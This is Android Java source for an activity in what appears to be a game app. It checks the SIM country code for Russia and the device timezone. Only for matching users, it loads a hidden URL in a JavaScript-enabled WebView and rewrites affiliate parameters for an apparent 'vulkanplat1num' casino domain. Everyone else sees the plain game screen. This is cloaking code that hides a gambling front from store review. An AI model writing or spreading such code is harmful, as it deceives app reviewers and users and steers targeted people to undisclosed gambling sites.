package cmmrjj.cokamr.ckk;

import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.icu.util.TimeZone;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;


import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;


public class GameEntryActivity extends AppCompatActivity {
    private static final String TAG = GameEntryActivity.class.getSimpleName();
    private static final String TAG_FOR_SHA = "Base64";

    private static final String one = "ru";

    private boolean mFlagStart = false;

    private static final String two = "rus";

    public ProgressDialog mProgressDialog;

    private static final String next = "SHA";

    private String otherString;
    private String nextData;

    private ProgressBar progressBar;

    private static final String QUERY_1 = "cid";
    private static final String QUERY_2 = "partid";



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate");
        setContentView(R.layout.activity_main);

        otherString = getString(R.string.opening_url);      // don't change value id
        nextData = getString(R.string.key_redirecting); // don't change value id

        progressBar = findViewById(R.id.progress);
        progressBar.setVisibility(View.VISIBLE);

        logData();
        openNextScreenGame();
    }

    public void showProgressDialog() {
        if (mProgressDialog == null) {
            mProgressDialog = new ProgressDialog(this);
            mProgressDialog.setMessage("gello");
            mProgressDialog.setIndeterminate(true);
        }

        mProgressDialog.show();
    }

    public void hideProgressDialog() {
        if (mProgressDialog != null && mProgressDialog.isShowing()) {
            mProgressDialog.dismiss();
        }
    }

    private String generateNext(String url) {
        String transformUrl = url;
        Intent intent = getIntent();
        if (intent != null) {
            Uri data = intent.getData();
            if (data != null) {
                if (data.getEncodedQuery() != null) {
                    if (data.getEncodedQuery().contains(QUERY_1)) {
                        String queryValue = data.getQueryParameter(QUERY_1);
                        transformUrl = transformUrl.replace(queryValue, QUERY_1);
                    } else if (data.getEncodedQuery().contains(QUERY_2)) {
                        String queryValue = data.getQueryParameter(QUERY_2);
                        transformUrl = transformUrl.replace(queryValue, QUERY_2);
                    }
                }
            }
        }
        return transformUrl;
    }


    @Override
    public void onStop() {
        super.onStop();
        hideProgressDialog();
    }

    @SuppressLint("PackageManagerGetSignatures")
    private void logData() {

        if (mFlagStart) {
            showProgressDialog();
        }

        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                    getApplicationContext().getPackageName(),
                    PackageManager.GET_SIGNATURES
            );
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance(next);
                md.update(signature.toByteArray());

                Log.i(TAG_FOR_SHA, Base64.encodeToString(md.digest(), Base64.NO_WRAP));
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.d(TAG_FOR_SHA, e.getMessage(), e);

        } catch (NoSuchAlgorithmException e) {
            Log.d(TAG_FOR_SHA, e.getMessage(), e);
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void openNextScreenGame() {
        Log.d(TAG, "openNextScreenGame");

        if (isValidUser() && check()) {
            progressBar.setVisibility(View.GONE);
            WebView webView = findViewById(R.id.web_view);
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (!url.contains(nextData)) {
                        if (url.contains("aff1b1b01.vulkanplat1num")) {
                            view.loadUrl(generateNext(url));
                        } else {
                            view.loadUrl(url);
                        }
                    } else {
                        openScreenGame();
                    }
                    return true;
                }

                @RequiresApi(Build.VERSION_CODES.N)
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                    String url = request.getUrl().toString();
                    if (!url.contains(nextData)) {
                        if (url.contains("aff1b1b01.vulkanplat1num")) {
                            view.loadUrl(generateNext(url));
                        } else {
                            view.loadUrl(url);
                        }
                    } else {
                        openScreenGame();
                    }
                    return true;
                }

                @Override
                public void onReceivedError(WebView view, WebResourceRequest request,
                                            WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    openScreenGame();
                }

                @Override
                public void onReceivedHttpError(WebView view, WebResourceRequest request,
                                                WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    openScreenGame();
                }
            });
            WebSettings webSettings = webView.getSettings();
            webSettings.setBuiltInZoomControls(true);
            webSettings.setSupportZoom(true);
            webSettings.setJavaScriptEnabled(true);
            webSettings.setAllowFileAccess(true);
            webView.loadUrl(otherString);
        } else {
            openScreenGame();
        }
    }

    private boolean check() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2,3,4,7,8,9,10,11,12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }
        return false;
    }

    private boolean isValidUser() {
        String countryCodeValue = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null){
            countryCodeValue = ((TelephonyManager)
                    getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        } else {
            return false;
        }
        return countryCodeValue != null
                && (countryCodeValue.equalsIgnoreCase(one)
                || countryCodeValue.equalsIgnoreCase(two));
    }

    @NonNull
    public static Intent openEntry(Context context) {
        return new Intent(context, GameEntryActivity.class);
    }

    private void openScreenGame() {
        Log.d(TAG, "openScreenGame");
        progressBar.setVisibility(View.GONE);
        startActivity(PlayGameActivity.getGameActivityIntent(this));
        overridePendingTransition(0,0);
        finish();
    }
}
